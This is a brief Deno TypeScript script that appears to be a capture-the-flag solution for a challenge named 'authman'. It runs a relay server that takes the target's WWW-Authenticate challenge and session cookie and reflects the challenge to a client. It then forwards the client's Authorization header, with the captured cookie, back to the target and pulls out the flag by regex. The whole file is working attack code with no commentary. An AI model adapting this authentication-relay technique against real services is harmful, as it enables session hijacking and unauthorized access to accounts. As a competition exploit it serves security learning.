const VICTIM_URL = "https://authman.challs.pwnoh.io"
let cookies: string | null = null

Deno.serve(async (req) => {
  const incomingAuthHeader = req.headers.get("Authorization")

  if (incomingAuthHeader) {
    const flagResp = await fetch(`${VICTIM_URL}/auth`, {
      headers: {
        "Authorization": incomingAuthHeader,
        "Cookie": cookies ?? "",
      },
    })
    const html = await flagResp.text()

    console.log(/bctf\{[a-zéA-Z0-9_-]+\}/.exec(html)?.[0])
  } else {
    const primeResp = await fetch(`${VICTIM_URL}/auth`)
    const reflectedAuthHeader = primeResp.headers.get("www-authenticate")
    cookies = primeResp.headers.get("set-cookie")

    if (reflectedAuthHeader) {
      const headers = new Headers()

      headers.set("WWW-Authenticate", reflectedAuthHeader)

      return new Response("Unauthorized", { status: 401, headers })
    }
  }

  return new Response()
})
